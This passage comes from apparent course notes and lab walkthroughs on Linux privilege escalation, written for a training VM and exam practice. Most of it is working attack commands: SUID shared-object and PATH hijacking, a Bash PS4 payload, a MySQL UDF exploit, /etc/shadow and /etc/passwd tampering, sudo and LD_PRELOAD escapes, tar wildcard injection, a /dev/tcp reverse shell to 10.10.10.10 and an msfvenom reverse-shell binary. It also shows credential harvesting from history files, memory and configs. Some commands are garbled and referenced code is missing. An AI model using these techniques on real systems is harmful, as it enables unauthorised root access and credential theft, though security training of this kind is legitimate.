<br>
<br>    3. Using searchsploit on our local machine, we find a local privilege escalation for this exact version:
<br>
<br>
<br>120
<br>Privilege Escalation
<br>
<br>    4. Copy the exploit script across to the target machine. You may need to remove ^M characters from the script:
<br> $ sed -e "s/^M//" 39535.sh > privesc.sh	
<br>Note that to get ^M you have to hold Ctrl and then press V and M in succession.
<br>    5. Make sure the script is executable:
<br> $ chmod + privesc.sh	
<br>
<br>
<br>
<br>121
<br>Privilege Escalation
<br>
<br>    6. Execute the script to gain a root shell:
<br>
<br>Shared Object Injection
<br>
<br>When a program is executed, it will try to load the shared objects it requires.
<br>By using a program called strace, we can track these system calls and determine whether any shared objects were not found.
<br>If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.
<br>Privilege Escalation
<br>
<br>    1. Find SUID/SGID files on the target:
<br>
<br>
<br>The suid-so file should execute with root user permissions.
<br>
<br>
<br>124
<br>Privilege Escalation
<br>
<br>    2. Run strace on the SUID file:
<br>
<br>The libcalc.so shared object could not be found, and the program is looking in our user’s home directory, which we can write to.
<br>
<br>125
<br>Privilege Escalation
<br>
<br>    3. Create the /home/user/.config directory.
<br>    4. Create the file libcalc.c with the following contents:
<br>
<br>126
<br>Privilege Escalation
<br>
<br>    5. Compile libcalc.c into /home/user/.config/libcalc.so:
<br>
<br> $ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c	
<br>
<br>    6. Run the SUID executable to get a root shell:
<br>
<br>
<br>127
<br>
<br>
<br>
<br>PATH Environment Variable
<br>
<br>The PATH environment variable contains a list of directories where the shell should try to find programs.
<br>If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found.
<br>Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.
<br>Finding Vulnerable Programs
<br>
<br>If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string.
<br>We can run strings on the executable file to find strings of characters.
<br>We can also use strace to see how the program is executing. Another program called ltrace may also be of use.
<br>
<br>
<br>129
<br>Finding Vulnerable Programs	(cont.)
<br>
<br>Running strings against a file:
<br>
<br> $ strings /path/to/file	
<br>
<br>Running strace against a command:
<br>
<br> $ strace -v -f -e execve <command> 2>&1 | grep exec	
<br>
<br>Running ltrace against a command:
<br>
<br>
<br> $ ltrace <command>	
<br>
<br>
<br>
<br>
<br>130
<br>Privilege Escalation
<br>
<br>    1. Find SUID/SGID files on the target:
<br>
<br>
<br>The suid-env file should execute with root user permissions.
<br>
<br>
<br>131
<br>Privilege Escalation
<br>
<br>    2. Run strings on the SUID file:
<br>
<br>The file could be trying to run the service program without a full path.
<br>    3. We can verify this with strace:
<br>
<br>
<br>132
<br>Privilege Escalation
<br>
<br>    4. Optionally, we can also verify with ltrace:
<br>
<br>This reveals that the system function is being used to execute the service program.
<br>    5. Create a file system.c with the following contents:
<br>
<br>
<br>133
<br>Privilege Escalation
<br>
<br>    6. Compile service.c into a file called service:
<br> $ gcc -o service service.c	
<br>    7. Prepend the current directory (or where the new service executable is located) to the PATH variable, and execute the SUID file for a root shell:
<br>
<br>
<br>134
<br>
<br>
<br>
<br>Abusing Shell Features	(#1)
<br>
<br>In some shells (notably Bash <4.2-048) it is possible to define user functions with an absolute path name.
<br>These functions can be exported so that subprocesses have access to them, and the functions can take precedence over the actual executable being called.
<br>Privilege Escalation
<br>
<br>    1. Find SUID/SGID files on the target:
<br>
<br>
<br>The suid-env file should execute with root user permissions.
<br>
<br>
<br>136
<br>Privilege Escalation
<br>
<br>    2. Run strings on the SUID file:
<br>
<br>The file could be trying to run the /usr/sbin/service program.
<br>    3. We can verify this with strace:
<br>
<br>137
<br>Privilege Escalation
<br>
<br>    4. Optionally, we can also verify with ltrace:
<br>
<br>This reveals that the system function is being used to execute the
<br>/usr/sbin/service program.
<br>    5. Verify the version of Bash is lower than 4.2-048:
<br>
<br>
<br>
<br>
<br>
<br>138
<br>Privilege Escalation
<br>
<br>    6. Create a Bash function with the name “/usr/sbin/service” and export the function:
<br>
<br>    7. Execute the SUID file for a root shell:
<br>
<br>Abusing Shell Features	(#2)
<br>
<br>Bash has a debugging mode which can be enabled with the –x command line option, or by modifying the SHELLOPTS environment variable to include xtrace.
<br>By default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set.
<br>When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.
<br>Abusing Shell Features	(#2) (cont.)
<br>
<br>If a SUID file runs another program via Bash (e.g. by using system() ) these environment variables can be inherited.
<br>If an SUID file is being executed, this command will execute with the privileges of the file owner.
<br>In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.
<br>
<br>141
<br>Privilege Escalation
<br>
<br>    1. Find SUID/SGID files on the target:
<br>
<br>
<br>The suid-env2 file should execute with root user permissions.
<br>
<br>
<br>142
<br>Privilege Escalation
<br>
<br>    2. Run strings on the SUID file:
<br>
<br>The file could be trying to run the /usr/sbin/service program.
<br>    3. We can verify this with strace:
<br>
<br>143
<br>Privilege Escalation
<br>
<br>    4. Optionally, we can also verify with ltrace:
<br>
<br>This reveals that the system function is being used to execute the service program.
<br>    5. Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
<br>
<br>
<br>144
<br>Privilege Escalation
<br>
<br>    6. Run the /tmp/rootbash file with the -p command line option to get a root shell:
<br>
<br>Passwords
<br>
<br>While it might seem like a long shot, weak password storage and password re-use can be easy ways to escalate privileges.
<br>While the root user’s account password is hashed and stored securely in /etc/shadow, other passwords, such as those for services may be stored in plaintext in config files.
<br>If the root user re-used their password for a service, that password may be found and used to switch to the root user.
<br>
<br>
<br>
<br>History Files
<br>
<br>History files record commands issued by users while they are using certain programs.
<br>If a user types a password as part of a command, this password may get stored in a history file.
<br>It is always a good idea to try switching to the root user with a discovered password.
<br>Privilege Escalation
<br>
<br>    1. View the contents of hidden files in the user’s home directory with filenames ending in “history”:
<br>
<br>
<br>It appears that the user connected to a MySQL server as the root user using the password “password123”.
<br>149
<br>Privilege Escalation
<br>
<br>    2. Use the su command to switch to the root user account, using the password found in the history file:
<br>
<br>
<br>
<br>
<br>
<br>
<br>150
<br>
<br>
<br>
<br>Config Files
<br>
<br>Many services and programs use configuration (config) files to store settings.
<br>If a service needs to authenticate to something, it might store the credentials in a config file.
<br>If these config files are accessible, and the passwords they store are reused by privileged users, we may be able to use it to log in as that user.
<br>Privilege Escalation
<br>
<br>    1. List the contents of the user’s home directory:
<br>
<br>    2. View the contents of the myvpn.ovpn config file:
<br>
<br>The auth-user-pass option in OpenVPN allows for the plaintext storage of credentials in a file (/etc/openvpn/auth.txt).
<br>
<br>
<br>152
<br>Privilege Escalation
<br>
<br>    3. View the contents of the /etc/openvpn/auth.txt file:
<br>
<br>    4. Use the su command to switch to the root user account, using the password found in the auth.txt file:
<br>
<br>
<br>
<br>153
<br>
<br>
<br>
<br>SSH Keys
<br>
<br>SSH keys can be used instead of passwords to authenticate users using SSH.
<br>SSH keys come in pairs: one private key, and one public key. The private key should always be kept secret.
<br>If a user has stored their private key insecurely, anyone who can read the key may be able to log into their account using it.
<br>154
<br>Privilege Escalation
<br>
<br>    1. A hidden directory (.ssh) exists in the system root directory. View the contents of this directory:
<br>
<br>The file root_key is world-readable.
<br>    2. View the contents of the root_key file:
<br>
<br>155
<br>Privilege Escalation
<br>
<br>    3. Copy the root_key file to your local machine and correct its permissions so SSH will accept it:
<br>
<br> $ chmod 600 root_key	
<br>
<br>    4. Use the key to connect to the SSH server as the root user:
<br>
<br>NFS
<br>
<br>NFS (Network File System) is a popular distributed file system. NFS shares are configured in the /etc/exports file.
<br>Remote users can mount shares, access, create, modify files.
<br>By default, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server.
<br>Useful Commands
<br>
<br>Show the NFS server’s export list:
<br>
<br> $ showmount -e <target>	
<br>
<br>Similar Nmap script:
<br>
<br> $ nmap –sV –script=nfs-showmount <target>	
<br>
<br>Mount an NFS share:
<br>
<br> $ mount -o rw,vers=2 <target>:<share> <local_directory>	
<br>
<br>
<br>159
<br>Root Squashing
<br>
<br>Root Squashing is how NFS prevents an obvious privilege escalation.
<br>If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group.
<br>While this behavior is default, it can be disabled!
<br>
<br>
<br>
<br>160
<br>no_root_squash
<br>
<br>no_root_squash is an NFS configuration option which turns root squashing off.
<br>When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.
<br>
<br>161
<br>Privilege Escalation
<br>
<br>    1. Check the contents of /etc/exports for shares with the no_root_squash option:
<br>
<br>    2. Confirm that the NFS share is available for remote mounting:
<br>
<br>
<br>
<br>162
<br>Privilege Escalation
<br>
<br>    3. Create a mount point on your local machine and mount the /tmp NFS share:
<br>
<br>    4. Using the root user on your local machine, generate a payload and save it to the mounted share:
<br>
<br>
<br>163
<br>Privilege Escalation
<br>
<br>    5. Make sure the file has the SUID bit set, and is executable by everyone:
<br>
<br> # chmod +xs /tmp/nfs/shell.elf	
<br>
<br>    6. On the target machine, execute the file to get a root shell:
<br>
<br>Enumeration
<br>
<br>    1. Check your user (id, whoami).
<br>    2. Run Linux Smart Enumeration with increasing levels.
<br>    3. Run LinEnum & other scripts as well!
<br>    4. If your scripts are failing and you don’t know why, you can always run the manual commands from this course, and other Linux PrivEsc cheatsheets online (e.g. https://blog.g0tmi1k.com/2011/08/basic- linux-privilege-escalation/)
<br>Strategy
<br>
<br>Spend some time and read over the results of your enumeration.
<br>If Linux Smart Enumeration level 0 or 1 finds something interesting, make a note of it.
<br>Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.
<br>
<br>
<br>
<br>167
<br>Strategy
<br>
<br>Have a quick look around for files in your user’s home directory and other common locations (e.g.
<br>/var/backup, /var/logs).
<br>If your user has a history file, read it, it may have important information like commands or even passwords.
<br>
<br>168
<br>Strategy
<br>
<br>Try things that don’t have many steps first, e.g. Sudo, Cron Jobs, SUID files.
<br>Have a good look at root processes, enumerate their versions and search for exploits.
<br>Check for internal ports that you might be able to forward to your attacking machine.
<br>
<br>169
<br>Strategy
<br>
<br>If you still don’t have root, re-read your full enumeration dumps and highlight anything that seems odd.
<br>This might be a process or file name you aren’t familiar with, an “unusual” filesystem configured (on Linux, anything that isn’t ext, swap, or tmpfs), or even a username.
<br>At this stage you can also start to think about Kernel Exploits.
<br>
<br>170
<br>Don’t Panic
<br>
<br>Privilege Escalation is tricky. Practice makes perfect.
<br>Remember: in an exam setting, it might take a while to find the method, but the exam is always intended to be completed within a timeframe. Keep searching!
<br>171
<br>look for the ssh private key of root
<br>Linux Lab Exercises
<br>
<br>Exercise 1 – Kernel
<br>Detection
<br>Linux VM
<br>    1. In command prompt type:
<br>/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
<br>    2. From the output, notice that the OS is vulnerable to “dirtycow”.
<br>
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type:
<br>gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
<br>    2. In command prompt type: ./c0w
<br>    3. In command prompt type: passwd
<br>    4. In command prompt type: id
<br>
<br>
<br>Exercise 2 – Daemons
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: dpkg -l | grep -i exim
<br>    2. From the output, notice that exim’s version is below 4.86.2.
<br>    3. In command prompt type: exim -bV -v | grep -i perl
<br>    4. From the output, notice that exim was compiled with Perl support.
<br>    5. In command prompt type: head /etc/exim.conf
<br>    6. From the output, notice that the configuration contains the “perl_startup” option.
<br>
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type: /home/user/tools/exim/cve-2016-1531.sh
<br>    2. In command prompt type: id
<br>Exercise 3 – Password Mining (Memory)
<br>Exploitation
<br>Kali VM
<br>    1. In command prompt type: msfconsole
<br>    2. In Metasploit (msf > prompt) type: use auxiliary/server/ftp
<br>    3. In Metasploit (msf > prompt) type: set FTPUSER user
<br>    4. In Metasploit (msf > prompt) type: set FTPPASS password321
<br>    5. In Metasploit (msf > prompt) type: run
<br>
<br>Linux VM
<br>    1. In command prompt type: ftp [Kali VM IP Address]
<br>    2. In ftp, type: user
<br>    3. In ftp, type: password321
<br>    4. In ftp press ctrl-z
<br>    5. In command prompt type: ps -ef | grep ftp
<br>    6. Make note of the PID of the ftp process.
<br>    7. In command prompt type: gdb -p [FTP PID]
<br>    8. In GDB, (gdb) prompt, type: info proc mappings
<br>    9. From the output, note the start and end memory addresses of the “[heap]”
<br>    10. In GDB. (gdb) prompt, type: q
<br>    11. In GDB, (gdb) prompt, type: dump memory /tmp/mem [Start Address] [End Address]
<br>    12. In GDB. (gdb) prompt, type: q
<br>    13. In command prompt type: strings /tmp/mem | grep passw
<br>    14. From the output, note the credentials in clear-text.
<br>
<br>
<br>Exercise 4 – Password Mining (Configuration Files)
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type: cat /home/user/myvpn.ovpn
<br>    2. From the output, make note of the value of the “auth-user-pass” directive.
<br>    3. In command prompt type: cat /etc/openvpn/auth.txt
<br>    4. From the output, make note of the clear-text credentials.
<br>    5. In command prompt type: cat /home/user/.irssi/config | grep -i passw
<br>    6. From the output, make note of the clear-text credentials.
<br>
<br>
<br>Exercise 5 – Password Mining (History)
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type: cat ~/.bash_history | grep -i passw
<br>    2. From the output, make note of the clear-text credentials.
<br>Exercise 6 – Sudo (Shell Escape Sequences)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: sudo -l
<br>    2. From the output, notice the list of programs that can run via sudo.
<br>
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type any of the following:
<br>        a. sudo find /bin -name nano -exec /bin/sh \;
<br>        b. sudo awk 'BEGIN {system("/bin/sh")}'
<br>        c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
<br>        d. sudo vim -c '!sh'
<br>
<br>
<br>Exercise 7 – Sudo (Abusing Intended Functionality)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: sudo -l
<br>    2. From the output, notice the list of programs that can run via sudo.
<br>
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type: sudo apache2 -f /etc/shadow
<br>    2. From the output, copy the root hash.
<br>
<br>Kali VM
<br>    1. Open command prompt and type: echo '[Pasted Root Hash]' > hash.txt
<br>    2. In command prompt type:
<br>john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
<br>    3. From the output, notice the cracked credentials.
<br>Exercise 8 – Sudo (LD_PRELOAD)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: sudo -l
<br>    2. From the output, notice that the LD_PRELOAD environment variable is intact.
<br>
<br>Exploitation
<br>    1. Open a text editor and type:
<br>
<br>    2. Save the file as x.c
<br>    3. In command prompt type:
<br>gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
<br>    4. In command prompt type:
<br>sudo LD_PRELOAD=/tmp/x.so apache2
<br>    5. In command prompt type: id
<br>
<br>
<br>Exercise 9 – NFS
<br>Detection
<br>Linux VM
<br>    1. In command line type: cat /etc/exports
<br>    2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.
<br>
<br>Exploitation
<br>Kali VM
<br>    1. Open command prompt and type: showmount -e [Linux VM IP Address]
<br>    2. In command prompt type: mkdir /tmp/1
<br>    3. In command prompt type: mount -o rw,vers=2 [Linux VM IP Address]:/tmp /tmp/1 In command prompt type:
<br>echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
<br>    4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x
<br>    5. In command prompt type: chmod +s /tmp/1/x
<br>
<br>Linux VM
<br>    1. In command prompt type: /tmp/x
<br>    2. In command prompt type: id
<br>Exercise 10 – Cron (Path)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: cat /etc/crontab
<br>    2. From the output, notice the value of the “PATH” variable.
<br>
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type:
<br>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
<br>    2. In command prompt type: chmod +x /home/user/overwrite.sh
<br>    3. Wait 1 minute for the Bash script to execute.
<br>    4. In command prompt type: /tmp/bash -p
<br>    5. In command prompt type: id
<br>
<br>
<br>Exercise 11 – Cron (Wildcards)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: cat /etc/crontab
<br>    2. From the output, notice the script “/usr/local/bin/compress.sh”
<br>    3. In command prompt type: cat /usr/local/bin/compress.sh
<br>    4. From the output, notice the wildcard (*) used by ‘tar’.
<br>
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type:
<br>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
<br>    2. touch /home/user/--checkpoint=1
<br>    3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
<br>    4. Wait 1 minute for the Bash script to execute.
<br>    5. In command prompt type: /tmp/bash -p
<br>    6. In command prompt type: id
<br>Exercise 12 – Cron (File Overwrite)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: cat /etc/crontab
<br>    2. From the output, notice the script “overwrite.sh”
<br>    3. In command prompt type: ls -l /usr/local/bin/overwrite.sh
<br>    4. From the output, notice the file permissions.
<br>
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type:
<br>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
<br>    2. Wait 1 minute for the Bash script to execute.
<br>    3. In command prompt type: /tmp/bash -p
<br>    4. In command prompt type: id
<br>
<br>
<br>Exercise 13 – File Permissions (Suid Binary – .so Injection)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
<br>    2. From the output, make note of all the SUID binaries.
<br>    3. In command line type:
<br>strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
<br>    4. From the output, notice that a .so file is missing from a writable directory.
<br>
<br>Exploitation
<br>Linux VM
<br>    5. In command prompt type: mkdir /home/user/.config
<br>    6. Open a text editor and type:
<br>
<br>    7. Save the file as libcalc.c
<br>    8. In command prompt type:
<br>gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
<br>    9. In command prompt type: /usr/local/bin/suid-so
<br>    10. In command prompt type: id
<br>Exercise 14 – File Permissions (SUID Binary – Symlink)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: dpkg -l | grep nginx
<br>    2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.
<br>
<br>Exploitation
<br>Linux VM – Terminal 1
<br>    1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su
<br>    2. Once escalated to root, in command prompt type: su -l www-data
<br>    3. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
<br>    4. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.
<br>
<br>Linux VM – Terminal 2
<br>    1. Once logged in, type: su
<br>    2. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
<br>    3. Switch back to the previous terminal.
<br>
<br>Linux VM – Terminal 1
<br>    1. From the output, notice that the exploit continued its execution.
<br>    2. In command prompt type: id
<br>
<br>
<br>Exercise 15 – File Permissions (SUID Binary – Environment Variables #1)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
<br>    2. From the output, make note of all the SUID binaries.
<br>    3. In command prompt type: strings /usr/local/bin/suid-env
<br>    4. From the output, notice the functions used by the binary.
<br>
<br>Exploitation
<br>Linux VM
<br>    1. In command prompt type:
<br>echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
<br>    2. In command prompt type: gcc /tmp/service.c -o /tmp/service
<br>    3. In command prompt type: export PATH=/tmp:$PATH
<br>    4. In command prompt type: /usr/local/bin/suid-env
<br>    5. In command prompt type: id
<br>Exercise 16 – File Permissions (SUID Binary – Environment Variables #2)
<br>Detection
<br>Linux VM
<br>    1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
<br>    2. From the output, make note of all the SUID binaries.
<br>    3. In command prompt type: strings /usr/local/bin/suid-env
<br>    4. From the output, notice the functions used by the binary.
<br>
<br>Exploitation Method #1
<br>Linux VM
<br>    1. In command prompt type:
<br>function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
<br>    2. In command prompt type: export -f /usr/sbin/service
<br>    3. In command prompt type: /usr/local/bin/suid-env2
<br>
<br>Exploitation Method #2
<br>Linux VM
<br>1. In command prompt type:
<br>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
<br>run "uname -a" cmd and then find the kernal and then see for any kernal exploits google,duckduckgo,github,exploit db,searchsploit (avalibe in kali terminal) and youtube and linux exploit suggester -2 might help you but do it if noting works
<br>
<br>
<br>Service Exploits
<br>
<br>The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
<br>Change into the /home/user/tools/mysql-udf directory:
<br>cd /home/user/tools/mysql-udf
<br>Compile the raptor_udf2.c exploit code using the following commands:
<br>gcc -g -c raptor_udf2.c -fPIC
<br>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
<br>Connect to the MySQL service as the root user with a blank password:
<br>mysql -u root
<br>Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
<br>use mysql;
<br>create table foo(line blob);
<br>insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
<br>select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
<br>create function do_system returns integer soname 'raptor_udf2.so';
<br>Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
<br>select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
<br>Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
<br>/tmp/rootbash -p
<br>Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
<br>rm /tmp/rootbash
<br>exit
<br>
<br>
<br>Weak File Permissions - Readable /etc/shadow
<br>
<br>The /etc/shadow file contains user password hashes and is usually readable only by the root user.
<br>Note that the /etc/shadow file on the VM is world-readable:
<br>ls -l /etc/shadow
<br>View the contents of the /etc/shadow file:
<br>cat /etc/shadow
<br>Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
<br>save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:
<br>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
<br>Switch to the root user, using the cracked password:
<br>su root
<br>
<br>
<br>Weak File Permissions - Writable /etc/shadow
<br>
<br>The /etc/shadow file contains user password hashes and is usually readable only by the root user.
<br>Note that the /etc/shadow file on the VM is world-writable:
<br>ls -l /etc/shadow
<br>Generate a new password hash with a password of your choice:
<br>mkpasswd -m sha-512 newpasswordhere
<br>Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
<br>Switch to the root user, using the new password:
<br>su root
<br>
<br>
<br>Weak File Permissions - Writable /etc/passwd
<br>
<br>The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
<br>Note that the /etc/passwd file is world-writable:
<br>ls -l /etc/passwd
<br>Generate a new password hash with a password of your choice:
<br>openssl passwd newpasswordhere
<br>Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
<br>Switch to the root user, using the new password:
<br>su root
<br>Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
<br>Now switch to the newroot user, using the new password:
<br>su newroot
<br>
<br>
<br>Sudo - Shell Escape Sequences
<br>
<br>List the programs which sudo allows your user to run:
<br>sudo -l
<br>Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
<br>Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.
<br>For an extra challenge, try to gain a root shell using all the programs on the list!
<br>
<br>
<br>Sudo - Environment Variables
<br>
<br>Sudo can be configured to inherit certain environment variables from the user's environment.
<br>Check which environment variables are inherited (look for the env_keep options):
<br>sudo -l
<br>LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
<br>Create a shared object using the code located at /home/user/tools/sudo/preload.c:
<br>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
<br>Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
<br>sudo LD_PRELOAD=/tmp/preload.so program-name-here
<br>A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.
<br>Run ldd against the apache2 program file to see which shared libraries are used by the program:
<br>ldd /usr/sbin/apache2
<br>Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
<br>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
<br>Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
<br>sudo LD_LIBRARY_PATH=/tmp apache2
<br>A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
<br>
<br>
<br>Cron Jobs - File Permissions
<br>
<br>Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
<br>View the contents of the system-wide crontab:
<br>cat /etc/crontab
<br>There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
<br>Locate the full path of the overwrite.sh file:
<br>locate overwrite.sh
<br>Note that the file is world-writable:
<br>ls -l /usr/local/bin/overwrite.sh
<br>Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
<br>#!/bin/bash
<br>bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
<br>Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
<br>nc -nvlp 4444
<br>
<br>
<br>Cron Jobs - PATH Environment Variable
<br>
<br>View the contents of the system-wide crontab:
<br>cat /etc/crontab
<br>Note that the PATH variable starts with /home/user which is our user's home directory.
<br>Create a file called overwrite.sh in your home directory with the following contents:
<br>#!/bin/bash
<br>cp /bin/bash /tmp/rootbash
<br>chmod +xs /tmp/rootbash
<br>Make sure that the file is executable:
<br>chmod +x /home/user/overwrite.sh
<br>Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
<br>/tmp/rootbash -p
<br>Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
<br>rm /tmp/rootbash
<br>exit
<br>
<br>
<br>Cron Jobs - Wildcards
<br>
<br>View the contents of the other cron job script:
<br>cat /usr/local/bin/compress.sh
<br>Note that the tar command is being run with a wildcard (*) in your home directory.
<br>Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
<br>Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
<br>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
<br>Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
<br>chmod +x /home/user/shell.elf
<br>Create these two files in /home/user:
<br>touch /home/user/--checkpoint=1
<br>touch /home/user/--checkpoint-action=exec=shell.elf
<br>When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
<br>Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
<br>nc -nvlp 4444
<br>Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
<br>rm /home/user/shell.elf
<br>rm /home/user/--checkpoint=1
<br>rm /home/user/--checkpoint-action=exec=shell.elf
<br>
<br>
<br>SUID / SGID Executables - Known Exploits
<br>
<br>Find all the SUID/SGID executables on the Debian VM:
<br>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
<br>Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!
<br>A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.
<br>Run the exploit script to gain a root shell:
<br>/home/user/tools/suid/exim/cve-2016-1531.sh
<br>Remember to exit out of the root shell before continuing!
<br>
<br>
<br>SUID / SGID Executables - Shared Object Injection
<br>
<br>The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
<br>First, execute the file and note that currently it displays a progress bar before exiting:
<br>/usr/local/bin/suid-so
